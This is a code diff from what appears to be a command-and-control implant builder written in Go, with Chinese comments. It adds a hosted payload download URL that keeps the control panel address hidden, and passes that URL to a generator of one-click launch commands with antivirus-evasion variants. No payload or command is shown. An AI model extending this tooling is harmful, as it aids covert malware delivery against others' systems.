@@ -330,6 +330,20 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		saveData = []byte(result.ShellcodeHex)
 	}
 
+	// 载荷记录（用于拼"托管下载地址"，与落库内容同源；这里先构造内存态）
+	storedForURL := &database.StoredImplant{
+		ID:        buildID,
+		Name:      req.Name,
+		Format:    req.Format,
+		OS:        req.OS,
+		Arch:      req.Arch,
+		Protocol:  req.Protocol,
+		ServerURL: req.ServerURL,
+		Filename:  filename,
+	}
+	// v1.4.3 #15b-B：托管地址走监听器端口，URL 里不出现面板入口；未启用时为空。
+	hostedURL := s.hostedPayloadURL(r, storedForURL)
+
 	response := BuildResponse{
 		ID:          buildID,
 		Name:        req.Name,
@@ -337,7 +351,8 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		Size:        len(saveData),
 		SHA256:      result.SHA256,
 		BuildTime:   result.BuildTime.Format(time.RFC3339),
-		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
+		DownloadURL: payloadPanelURL(buildID),
+		HostedURL:   hostedURL,
 	}
 	// 代码签名结果：把"签没签上、谁签的、为什么没签"如实带回给前端与调用方
 	if result.Sign != nil {
@@ -349,7 +364,7 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	// 一键上线命令：地址由服务端按目标机可达性解析（见 oneliner.go），
 	// 并一次性给出多套免杀变体（含加载器链），前端只负责展示。
-	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost); set != nil {
+	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost, hostedURL); set != nil {
 		response.OneLinerHost = set.Host
 		response.OneLinerBase = set.BaseURL
 		response.OneLinerWarning = set.Warning
